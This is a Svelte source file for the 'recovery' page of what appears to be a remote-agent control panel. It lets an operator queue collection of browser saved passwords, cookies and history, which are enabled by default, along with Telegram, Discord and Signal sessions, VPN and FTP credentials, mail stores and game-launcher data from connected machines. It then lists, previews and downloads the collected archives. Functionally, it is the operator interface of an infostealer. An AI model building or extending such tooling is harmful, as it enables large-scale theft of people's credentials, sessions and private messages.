<script lang="ts">
	import { onMount } from 'svelte';
	import { Button } from '$lib/components/ui/button/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import { Textarea } from '$lib/components/ui/textarea/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Badge } from '$lib/components/ui/badge/index.js';
	import {
		Card,
		CardContent,
		CardDescription,
		CardFooter,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import { Alert, AlertDescription, AlertTitle } from '$lib/components/ui/alert/index.js';
	import { getClientTool } from '$lib/data/client-tools';
	import type { Client } from '$lib/data/clients';
	import { appendWorkspaceLog, createWorkspaceLogEntry } from '$lib/workspace/utils';
	import type { WorkspaceLogEntry } from '$lib/workspace/types';
	import type {
		RecoveryArchive,
		RecoveryArchiveDetail,
		RecoveryTargetSelection
	} from '$lib/types/recovery';

const { client } = $props<{ client: Client }>();
void client;

const tool = getClientTool('recovery');
void tool;

	type BuiltInTarget = Exclude<RecoveryTargetSelection['type'], 'custom-path'>;

	const targetOptions: Array<{
		id: BuiltInTarget;
		label: string;
		description: string;
		default?: boolean;
	}> = [
		{
			id: 'chromium-history',
			label: 'Chromium history',
			description: 'Copy the Chromium/Chrome history SQLite database.',
			default: true
		},
		{
			id: 'chromium-bookmarks',
			label: 'Chromium bookmarks',
			description: 'Export bookmarks JSON and Last Session state.',
			default: true
		},
		{
			id: 'chromium-cookies',
			label: 'Chromium cookies',
			description: 'Collect encrypted Chromium cookie stores.',
			default: true
		},
		{
			id: 'chromium-passwords',
			label: 'Chromium saved passwords',
			description: 'Acquire Chromium “Login Data” credential database.',
			default: true
		},
		{
			id: 'gecko-history',
			label: 'Gecko browser history',
			description: 'Copy Mozilla Firefox/LibreWolf/Waterfox places.sqlite history.',
			default: true
		},
		{
			id: 'gecko-bookmarks',
			label: 'Gecko bookmarks',
			description: 'Archive places.sqlite and bookmark backups from Gecko profiles.',
			default: true
		},
		{
			id: 'gecko-cookies',
			label: 'Gecko cookies',
			description: 'Collect cookies.sqlite stores from Gecko-based browsers.',
			default: true
		},
		{
			id: 'gecko-passwords',
			label: 'Gecko saved passwords',
			description: 'Capture logins.json and key databases for Gecko credentials.',
			default: true
		},
		{
			id: 'minecraft-saves',
			label: 'Minecraft saves',
			description: 'Archive .minecraft/saves worlds and metadata.'
		},
		{
			id: 'minecraft-config',
			label: 'Minecraft configs',
			description: 'Capture .minecraft/config mod and client configuration.'
		},
		{
			id: 'telegram-session',
			label: 'Telegram Desktop session',
			description: 'Collect Telegram Desktop tdata session files.'
		},
		{
			id: 'pidgin-data',
			label: 'Pidgin profiles',
			description: 'Capture Pidgin .purple accounts, chat logs, and configuration.'
		},
		{
			id: 'psi-data',
			label: 'Psi / Psi+ profiles',
			description: 'Collect Psi and Psi+ configuration, history, and credential stores.'
		},
		{
			id: 'discord-data',
			label: 'Discord data',
			description: 'Archive Discord application data for stable, PTB, and Canary builds.'
		},
		{
			id: 'slack-data',
			label: 'Slack data',
			description: 'Gather Slack desktop workspace caches and local session data.'
		},
		{
			id: 'element-data',
			label: 'Element / Riot data',
			description: 'Collect Element and Riot Matrix client profiles and caches.'
		},
		{
			id: 'icq-data',
			label: 'ICQ data',
			description: 'Capture ICQ desktop client application data and logs.'
		},
		{
			id: 'signal-data',
			label: 'Signal Desktop data',
			description: 'Archive Signal Desktop profiles, configuration, and message caches.'
		},
		{
			id: 'viber-data',
			label: 'Viber data',
			description: 'Collect Viber desktop profile stores and attachments.'
		},
		{
			id: 'whatsapp-data',
			label: 'WhatsApp Desktop data',
			description: 'Gather WhatsApp Desktop caches, databases, and configuration.'
		},
		{
			id: 'skype-data',
			label: 'Skype data',
			description: 'Capture Skype and Skype for Desktop profiles, caches, and history.'
		},
		{
			id: 'tox-data',
			label: 'Tox data',
			description: 'Collect Tox profile directories and encrypted identity files.'
		},
		{
			id: 'nordvpn-data',
			label: 'NordVPN data',
			description: 'Gather NordVPN application state, profiles, and diagnostic logs.'
		},
		{
			id: 'openvpn-data',
			label: 'OpenVPN data',
			description: 'Collect OpenVPN and OpenVPN Connect configuration and profiles.'
		},
		{
			id: 'protonvpn-data',
			label: 'Proton VPN data',
			description: 'Archive Proton VPN desktop caches, configuration, and session data.'
		},
		{
			id: 'surfshark-data',
			label: 'Surfshark VPN data',
			description: 'Gather Surfshark VPN desktop configuration and local storage.'
		},
		{
			id: 'expressvpn-data',
			label: 'ExpressVPN data',
			description: 'Collect ExpressVPN desktop profiles, diagnostics, and cached configs.'
		},
		{
			id: 'cyberghost-data',
			label: 'CyberGhost VPN data',
			description: 'Capture CyberGhost VPN application data, settings, and logs.'
		},
		{
			id: 'foxmail-data',
			label: 'FoxMail data',
			description: 'Gather FoxMail profile stores and account data.'
		},
		{
			id: 'mailbird-data',
			label: 'Mailbird data',
			description: 'Collect Mailbird local store and configuration folders.'
		},
		{
			id: 'outlook-data',
			label: 'Outlook data',
			description: 'Archive Outlook OST/PST caches, RoamCache, and Outlook Files.'
		},
		{
			id: 'thunderbird-data',
			label: 'Thunderbird data',
			description: 'Collect Thunderbird profile directories and mail stores.'
		},
		{
			id: 'cyberduck-data',
			label: 'Cyberduck data',
			description: 'Gather Cyberduck bookmarks, preferences, and transfer logs.'
		},
		{
			id: 'filezilla-data',
			label: 'FileZilla data',
			description: 'Collect FileZilla site manager entries, queue data, and logs.'
		},
		{
			id: 'winscp-data',
			label: 'WinSCP data',
			description: 'Archive WinSCP session profiles, preferences, and cached credentials.'
		},
		{
			id: 'growtopia-data',
			label: 'Growtopia data',
			description: 'Copy Growtopia client configuration, logs, and local storage.'
		},
		{
			id: 'roblox-data',
			label: 'Roblox data',
			description: 'Collect Roblox launcher caches, settings, and saved telemetry.'
		},
		{
			id: 'battlenet-data',
			label: 'Battle.net data',
			description: 'Capture Battle.net launcher manifests, caches, and configuration.'
		},
		{
			id: 'ea-app-data',
			label: 'EA App / Origin data',
			description: 'Archive EA App and Origin launcher configuration and local caches.'
		},
		{
			id: 'epic-games-data',
			label: 'Epic Games Launcher data',
			description: 'Gather Epic Games Launcher manifests, installed titles, and settings.'
		},
		{
			id: 'steam-data',
			label: 'Steam data',
			description: 'Collect Steam client configuration, library metadata, and caches.'
		},
		{
			id: 'ubisoft-connect-data',
			label: 'Ubisoft Connect data',
			description: 'Capture Ubisoft Connect launcher profiles, logs, and cache directories.'
		},
		{
			id: 'gog-galaxy-data',
			label: 'GOG Galaxy data',
			description: 'Archive GOG Galaxy databases, manifests, and cached configuration.'
		},
		{
			id: 'riot-client-data',
			label: 'Riot Client data',
			description: 'Collect Riot Client launcher settings, manifests, and telemetry logs.'
		}
	];

	const initialSelections = targetOptions.reduce(
		(acc, option) => {
			acc[option.id] = Boolean(option.default);
			return acc;
		},
		{} as Record<BuiltInTarget, boolean>
	);

	let targetSelections = $state(initialSelections);
	let customPaths = $state('');
	let archiveName = $state('');
	let notes = $state('');

	let queueing = $state(false);
	let queueError = $state<string | null>(null);
	let queueSuccess = $state<string | null>(null);

	const ARCHIVE_REFRESH_INTERVAL_MS = 15_000;

	let log = $state<WorkspaceLogEntry[]>([]);

	let archives = $state<RecoveryArchive[]>([]);
	let archivesError = $state<string | null>(null);
	let loadingArchives = $state(false);

	let archiveDetails = $state<Record<string, RecoveryArchiveDetail>>({});
	let expandedArchiveId = $state<string | null>(null);

	let previewSelection = $state<{ archiveId: string; path: string } | null>(null);
	let previewData = $state<{ content: string; encoding: 'utf-8' | 'base64'; size: number } | null>(
		null
	);
	let previewLoading = $state(false);
	let previewError = $state<string | null>(null);

	const customPathList = $derived(parseCustomPaths(customPaths));
	const selectedTargetCount = $derived(
		targetOptions.filter((option) => targetSelections[option.id]).length + customPathList.length
	);

const heroMetadata = $derived([
	{ label: 'Configured targets', value: selectedTargetCount.toString() },
	{ label: 'Archives stored', value: archives.length.toString() },
	{
		label: 'Last archive',
		value: archives[0]?.createdAt ? formatRelative(archives[0].createdAt) : '-'
	}
]);
void heroMetadata;

	const dateFormatter = new Intl.DateTimeFormat(undefined, {
		dateStyle: 'medium',
		timeStyle: 'short'
	});

	function parseCustomPaths(value: string): string[] {
		return value
			.split(/\r?\n/)
			.map((line) => line.trim())
			.filter((line) => line.length > 0);
	}

	function formatBytes(value: number): string {
		if (!Number.isFinite(value) || value < 0) {
			return '—';
		}
		const units = ['B', 'KB', 'MB', 'GB', 'TB'];
		let size = value;
		let index = 0;
		while (size >= 1024 && index < units.length - 1) {
			size /= 1024;
			index += 1;
		}
		const digits = index === 0 ? 0 : 1;
		return `${size.toFixed(digits)} ${units[index]}`;
	}

	function formatDate(value: string): string {
		try {
			return dateFormatter.format(new Date(value));
		} catch {
			return value;
		}
	}

	function formatRelative(value: string): string {
		const date = new Date(value);
		if (Number.isNaN(date.getTime())) {
			return 'Unknown';
		}
		const diff = date.getTime() - Date.now();
		const abs = Math.abs(diff);
		const units: Array<[Intl.RelativeTimeFormatUnit, number]> = [
			['day', 24 * 60 * 60 * 1000],
			['hour', 60 * 60 * 1000],
			['minute', 60 * 1000],
			['second', 1000]
		];
		const formatter = new Intl.RelativeTimeFormat(undefined, { numeric: 'auto' });
		for (const [unit, ms] of units) {
			if (abs >= ms || unit === 'second') {
				return formatter.format(Math.round(diff / ms), unit);
			}
		}
		return 'just now';
	}

	function buildSelections(): RecoveryTargetSelection[] {
		const selections: RecoveryTargetSelection[] = [];
		for (const option of targetOptions) {
			if (targetSelections[option.id]) {
				selections.push({ type: option.id });
			}
		}
		for (const path of customPathList) {
			selections.push({ type: 'custom-path', path });
		}
		return selections;
	}

	async function queueRecovery() {
		queueError = null;
		queueSuccess = null;
		const selections = buildSelections();
		if (selections.length === 0) {
			queueError = 'Select at least one built-in target or specify a custom path.';
			return;
		}

		queueing = true;
		const payload = {
			selections,
			archiveName: archiveName.trim() || undefined,
			notes: notes.trim() || undefined
		};

		try {
			const response = await fetch(`/api/agents/${client.id}/recovery`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(payload)
			});
			if (!response.ok) {
				const detail = (await response.text()) || 'Failed to queue recovery request';
				throw new Error(detail.trim());
			}
			const body = (await response.json()) as { requestId: string };
			log = appendWorkspaceLog(
				log,
				createWorkspaceLogEntry('Recovery request queued', body.requestId, 'queued')
			);
			queueSuccess = `Recovery request ${body.requestId} queued`;
			archiveName = '';
			notes = '';
			await loadArchives();
		} catch (err) {
			const message = err instanceof Error ? err.message : 'Failed to queue recovery';
			queueError = message;
			log = appendWorkspaceLog(
				log,
				createWorkspaceLogEntry('Recovery queue failed', message, 'failed')
			);
		} finally {
			queueing = false;
		}
	}

	async function loadArchives() {
		if (loadingArchives) {
			return;
		}
		loadingArchives = true;
		archivesError = null;
		try {
			const response = await fetch(`/api/agents/${client.id}/recovery`);
			if (!response.ok) {
				throw new Error(`Status ${response.status}`);
			}
			const body = (await response.json()) as { archives: RecoveryArchive[] };
			archives = body.archives ?? [];
			const activeIds = new Set(archives.map((archive) => archive.id));
			archiveDetails = Object.fromEntries(
				Object.entries(archiveDetails).filter(([id]) => activeIds.has(id))
			);
			if (expandedArchiveId && !activeIds.has(expandedArchiveId)) {
				expandedArchiveId = null;
				previewSelection = null;
				previewData = null;
				previewError = null;
			}
		} catch (err) {
			archivesError = err instanceof Error ? err.message : 'Failed to load recovery archives';
		} finally {
			loadingArchives = false;
		}
	}

	async function ensureArchiveDetail(id: string) {
		if (archiveDetails[id]) {
			return;
		}
		try {
			const response = await fetch(`/api/agents/${client.id}/recovery/${id}`);
			if (!response.ok) {
				throw new Error(`Status ${response.status}`);
			}
			const body = (await response.json()) as { archive: RecoveryArchiveDetail };
			archiveDetails = { ...archiveDetails, [id]: body.archive };
		} catch (err) {
			const message = err instanceof Error ? err.message : 'Failed to load archive manifest';
			archivesError = message;
		}
	}

	async function toggleArchive(id: string) {
		if (expandedArchiveId === id) {
			expandedArchiveId = null;
			return;
		}
		await ensureArchiveDetail(id);
		expandedArchiveId = id;
		previewSelection = null;
		previewData = null;
		previewError = null;
	}

	async function previewEntry(archiveId: string, path: string) {
		previewSelection = { archiveId, path };
		previewLoading = true;
		previewData = null;
		previewError = null;
		try {
			const response = await fetch(
				`/api/agents/${client.id}/recovery/${archiveId}/file?path=${encodeURIComponent(path)}`
			);
			if (!response.ok) {
				const detail = await response.text();
				throw new Error(detail || `Status ${response.status}`);
			}
			const body = (await response.json()) as {
				content: string;
				encoding: 'utf-8' | 'base64';
				size: number;
			};
			previewData = body;
		} catch (err) {
			previewError = err instanceof Error ? err.message : 'Failed to preview file';
		} finally {
			previewLoading = false;
		}
	}

	function downloadEntryUrl(archiveId: string, path: string): string {
		return `/api/agents/${client.id}/recovery/${archiveId}/file?path=${encodeURIComponent(path)}&download=1`;
	}

	function downloadArchiveUrl(archiveId: string): string {
		return `/api/agents/${client.id}/recovery/${archiveId}/download`;
	}

	function targetSummary(archive: RecoveryArchive): string {
		if (!archive.targets || archive.targets.length === 0) {
			return 'Custom selection';
		}
		return archive.targets
			.map((target) => target.label || target.type.replace(/-/g, ' '))
			.join(', ');
	}

	onMount(() => {
		void loadArchives();
		const timer = setInterval(() => {
			void loadArchives();
		}, ARCHIVE_REFRESH_INTERVAL_MS);

		return () => {
			clearInterval(timer);
		};
	});
</script>

<div class="space-y-6">
	<Card>
		<CardHeader>
			<CardTitle class="text-base">Recovery plan</CardTitle>
			<CardDescription
				>Select the artefacts to collect and optionally add custom locations.</CardDescription
			>
		</CardHeader>
		<CardContent class="space-y-4">
			<div class="grid gap-3 sm:grid-cols-2">
				{#each targetOptions as option (option.id)}
					<label class="flex items-start gap-3 rounded-lg border border-border/60 bg-muted/30 p-3">
						<div class="flex-1 space-y-1">
							<p class="text-sm font-medium text-foreground">{option.label}</p>
							<p class="text-xs leading-relaxed text-muted-foreground">{option.description}</p>
						</div>
						<Switch
							bind:checked={targetSelections[option.id]}
							aria-label={`Toggle ${option.label}`}
						/>
					</label>
				{/each}
			</div>

			<div class="space-y-2">
				<Label class="text-sm font-medium text-foreground">Custom paths</Label>
				<Textarea
					placeholder="One path per line. Supports absolute files or directories."
					rows={3}
					bind:value={customPaths}
				/>
				{#if customPathList.length > 0}
					<p class="text-xs text-muted-foreground">
						{customPathList.length} custom {customPathList.length === 1 ? 'path' : 'paths'} configured.
					</p>
				{/if}
			</div>

			<div class="grid gap-4 sm:grid-cols-2">
				<div class="space-y-2">
					<Label class="text-sm font-medium text-foreground">Archive name</Label>
					<Input
						placeholder="Optional friendly name (zip suffix added automatically)."
						bind:value={archiveName}
					/>
				</div>
				<div class="space-y-2">
					<Label class="text-sm font-medium text-foreground">Notes</Label>
					<Input placeholder="Operator notes (stored with archive metadata)." bind:value={notes} />
				</div>
			</div>

			{#if queueError}
				<Alert variant="destructive">
					<AlertTitle>Queue failed</AlertTitle>
					<AlertDescription>{queueError}</AlertDescription>
				</Alert>
			{/if}
			{#if queueSuccess}
				<Alert>
					<AlertTitle>Recovery queued</AlertTitle>
					<AlertDescription>{queueSuccess}</AlertDescription>
				</Alert>
			{/if}
		</CardContent>
		<CardFooter class="flex flex-wrap gap-3">
			<Button type="button" onclick={queueRecovery} disabled={queueing}>
				{queueing ? 'Queueing…' : 'Queue recovery'}
			</Button>
		</CardFooter>
	</Card>

	<Card class="border-slate-200/80 dark:border-slate-800/80">
		<CardHeader>
			<CardTitle class="text-base">Recovered archives</CardTitle>
			<CardDescription>Browse collected artefacts and download staged archives.</CardDescription>
		</CardHeader>
		<CardContent class="space-y-4">
			{#if loadingArchives}
				<p class="text-sm text-muted-foreground">Loading recovery archives…</p>
			{:else if archivesError}
				<Alert variant="destructive">
					<AlertTitle>Unable to load archives</AlertTitle>
					<AlertDescription>{archivesError}</AlertDescription>
				</Alert>
			{:else if archives.length === 0}
				<p class="text-sm text-muted-foreground">No recovery archives have been uploaded yet.</p>
			{:else}
				<div class="space-y-4">
					{#each archives as archive (archive.id)}
						{@const detail = archiveDetails[archive.id]}
						<div class="rounded-lg border border-border/60 bg-muted/20 p-4">
							<div class="flex flex-wrap items-center justify-between gap-3">
								<div class="space-y-1">
									<p class="text-sm font-semibold text-foreground">{archive.name}</p>
									<p class="text-xs text-muted-foreground">
										{formatDate(archive.createdAt)} · {formatBytes(archive.size)} ·
										{archive.entryCount}
										{archive.entryCount === 1 ? 'entry' : 'entries'}
									</p>
									{#if archive.notes}
										<p class="text-xs text-muted-foreground">Notes: {archive.notes}</p>
									{/if}
								</div>
								<div class="flex flex-wrap items-center gap-2">
									<Badge variant="secondary">{targetSummary(archive)}</Badge>
									<Button
										variant="outline"
										href={downloadArchiveUrl(archive.id)}
										rel="noopener noreferrer"
										target="_blank"
									>
										Download archive
									</Button>
									<Button variant="ghost" onclick={() => toggleArchive(archive.id)}>
										{expandedArchiveId === archive.id ? 'Hide manifest' : 'View manifest'}
									</Button>
								</div>
							</div>

							{#if expandedArchiveId === archive.id}
								<div class="mt-4 space-y-3">
									{#if !detail}
										<p class="text-sm text-muted-foreground">Loading manifest…</p>
									{:else if detail.manifest.length === 0}
										<p class="text-sm text-muted-foreground">
											No entries captured for this archive.
										</p>
									{:else}
										{#if detail.targets?.length}
											<div class="space-y-1 text-xs text-muted-foreground">
												{#each detail.targets as target (target.type + (target.label ?? '') + (target.path ?? '') + (target.paths?.join(',') ?? ''))}
													<p>
														<span class="font-medium text-foreground">
															{target.label || target.type.replace(/-/g, ' ')}
														</span>
														{#if target.resolvedPaths && target.resolvedPaths.length > 0}
															: {target.resolvedPaths.join(', ')}
														{:else}
															: No resolved paths reported
														{/if}
													</p>
												{/each}
											</div>
										{/if}
										<div class="overflow-x-auto">
											<table class="min-w-full text-left text-sm">
												<thead
													class="border-b border-border/60 text-xs text-muted-foreground uppercase"
												>
													<tr>
														<th class="px-3 py-2 font-medium">Entry</th>
														<th class="px-3 py-2 font-medium">Size</th>
														<th class="px-3 py-2 font-medium">Modified</th>
														<th class="px-3 py-2 font-medium">Target</th>
														<th class="px-3 py-2 text-right font-medium">Actions</th>
													</tr>
												</thead>
												<tbody class="divide-y divide-border/50">
													{#each detail.manifest as entry (entry.path)}
														<tr class="align-top">
															<td class="px-3 py-2">
																<p class="font-medium text-foreground">{entry.path}</p>
																{#if entry.sourcePath}
																	<p class="text-xs text-muted-foreground">{entry.sourcePath}</p>
																{/if}
															</td>
															<td class="px-3 py-2 text-xs text-muted-foreground">
																{entry.type === 'file' ? formatBytes(entry.size) : '—'}
															</td>
															<td class="px-3 py-2 text-xs text-muted-foreground"
																>{formatDate(entry.modifiedAt)}</td
															>
															<td class="px-3 py-2 text-xs text-muted-foreground"
																>{entry.target.replace(/-/g, ' ')}</td
															>
															<td class="px-3 py-2 text-right text-xs">
																{#if entry.type === 'file'}
																	<div class="flex justify-end gap-2">
																		<Button
																			size="sm"
																			variant="outline"
																			onclick={() => previewEntry(archive.id, entry.path)}
																			disabled={previewLoading &&
																				previewSelection?.path === entry.path}
																		>
																			Preview
																		</Button>
																		<Button
																			size="sm"
																			variant="ghost"
																			href={downloadEntryUrl(archive.id, entry.path)}
																			rel="noopener noreferrer"
																			target="_blank"
																		>
																			Download
																		</Button>
																	</div>
																{/if}
															</td>
														</tr>
													{/each}
												</tbody>
											</table>
										</div>
									{/if}
								</div>
							{/if}
						</div>
					{/each}
				</div>
			{/if}
		</CardContent>
	</Card>

	{#if previewSelection}
		<Card class="border-slate-200/80 bg-muted/30 dark:border-slate-800/80">
			<CardHeader>
				<CardTitle class="text-base">Preview · {previewSelection.path}</CardTitle>
				<CardDescription>
					{previewLoading
						? 'Retrieving file preview from archive…'
						: previewError
							? previewError
							: previewData
								? previewData.encoding === 'base64'
									? 'Binary content displayed as base64.'
									: 'UTF-8 content preview.'
								: 'Select an entry to preview its contents.'}
				</CardDescription>
			</CardHeader>
			<CardContent>
				<div class="mb-3 flex justify-end">
					<Button
						size="sm"
						variant="outline"
						href={downloadEntryUrl(previewSelection.archiveId, previewSelection.path)}
						rel="noopener noreferrer"
						target="_blank"
						disabled={previewLoading}
					>
						Download file
					</Button>
				</div>
				{#if previewLoading}
					<p class="text-sm text-muted-foreground">Loading…</p>
				{:else if previewError}
					<Alert variant="destructive">
						<AlertTitle>Preview error</AlertTitle>
						<AlertDescription>{previewError}</AlertDescription>
					</Alert>
				{:else if previewData}
					<pre class="max-h-80 overflow-auto rounded-md bg-black/90 p-4 text-xs text-white">
{previewData.content}
                                        </pre>
					<p class="mt-2 text-xs text-muted-foreground">
						{formatBytes(previewData.size)} · Encoding {previewData.encoding}
					</p>
				{:else}
					<p class="text-sm text-muted-foreground">Select a file entry to preview.</p>
				{/if}
			</CardContent>
		</Card>
	{/if}
</div>
